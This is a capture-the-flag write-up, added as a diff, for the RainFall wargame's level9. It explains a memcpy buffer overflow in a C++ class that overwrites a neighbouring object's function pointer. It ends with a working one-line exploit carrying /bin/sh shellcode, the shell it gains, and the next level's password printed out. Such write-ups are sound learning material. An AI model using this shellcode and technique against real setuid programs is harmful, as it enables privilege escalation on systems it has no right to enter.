@@ -1,0 +1,38 @@
+There is a setuid binary "level9" own by bonus
+
+After disassembling the binary we can see that it's not a c program but a ++ one
+
+There is a class N structured with
+a function pointer, a 100 Bytes buffer, a int
+and some methods
+
+The setAnnotation() method use memcpy to write data in buffer but without doing a bounds checking on the buffer
+which lead to Buffer Overflow
+
+Here a memory view for the two N class
+|------------------------------------|-----|------------------------------------|
+|              108 Bytes             |     |              108 Bytes             |
+| N                               n1 |  4  | N                               n2 |
+|                                    |  B  |                                    |
+|------------------------------------|  y  |------------------------------------|
+|   4 Bytes  |  100 Bytes  | 4 Bytes |  t  |   4 Bytes  |  100 Bytes  | 4 Bytes |
+| **function |             |   int   |  e  | **function |             |   int   |
+|            |             |         |  s  |            |             |         |
+|  function  |    buffer   |  value  |     |  function  |    buffer   |  value  |
+|------------------------------------|-----|------------------------------------|
+
+If we overflow the first buffer we can change the function pointer address of the second class
+
+We put a SHELLCODE inside the first buffer and overflow to set the function pointer address to the address of the buffer
+
+But the program derefer the function pointer and do a call on it
+
+so we prepend the SHELLCODE with a address 4 Bytes after the start of the buffer
+
+that all, we send this payload in first argument, and we get a shell
+
+
+level9@RainFall:~$> ./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "a" * 83 + "\x0c\xa0\x04\x08"'`
+
+bonus0@RainFall:~$> cat ~bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
